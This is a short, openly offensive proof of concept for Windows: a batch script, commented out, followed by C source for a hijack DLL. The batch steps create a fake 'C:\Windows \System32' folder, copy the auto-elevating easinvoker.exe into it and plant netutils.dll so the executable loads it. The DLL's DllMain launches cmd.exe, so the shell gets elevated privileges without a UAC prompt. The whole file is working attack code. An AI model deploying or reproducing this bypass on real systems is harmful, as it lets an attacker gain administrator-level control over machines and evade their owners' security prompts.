//@echo off
//cd %USERPROFILE%\Desktop
//mkdir "\\?\C:\Windows "
//mkdir "\\?\C:\Windows \System32"
//copy "c:\windows\system32\easinvoker.exe" "C:\Windows \System32\"
//cd c:\windows\temp
//copy "netutils.dll" "C:\Windows \System32\"
//"C:\Windows \System32\easinvoker.exe"
//del /q "C:\Windows \System32\*"
//rmdir "C:\Windows \System32\"
//rmdir "C:\Windows \"
//cd %USERPROFILE%\Desktop
//x86_64-w64-mingw32-gcc netutils.c -shared -o netutils.dll
#include <windows.h>
#include <lm.h>
#include <wtypes.h>

BOOL APIENTRY DllMain (HMODULE hModule, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            WinExec("cmd.exe", 1); 
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
NET_API_STATUS WINAPI NetApiBufferFree(LPVOID Buffer)
{
        Sleep(INFINITE);
        return 1;
}
